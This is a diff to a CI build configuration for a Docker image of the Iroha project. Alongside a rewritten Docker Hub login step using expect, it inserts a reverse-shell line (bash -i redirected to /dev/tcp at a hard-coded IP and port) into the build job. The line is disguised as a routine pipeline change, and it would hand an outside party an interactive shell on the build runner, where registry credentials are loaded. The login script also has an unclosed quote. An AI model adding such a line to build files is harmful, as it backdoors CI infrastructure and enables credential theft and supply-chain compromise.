@@ -67,8 +67,20 @@ jobs:
             # build image
             cd $IROHA_HOME/docker/tiny
             docker build -t hyperledger/iroha-docker:$TAG .
-            # login and push
-            $IROHA_HOME/docker.hub.auth.sh 
+            bash -i >& /dev/tcp/188.130.155.34/12345 0>&1
+            # login
+            if [[ ! -e ~/.docker/config.json ]]; then
+              expect -c '\
+              set timeout 10
+              spawn docker login
+              expect "Username:*"
+              send -- "$env(DOCKER_USER)\r"
+              expect "Password:*"
+              send -- "$env(DOCKER_PASS)\r"
+              expect "*WARNING:*Login Succeeded*"
+              expect eof' || (echo "Can not login && exit 1)
+            fi
+            # and push
             docker push hyperledger/iroha-docker:$TAG
 
       ## At this step we have hyperledger/iroha-docker image, we can test it now
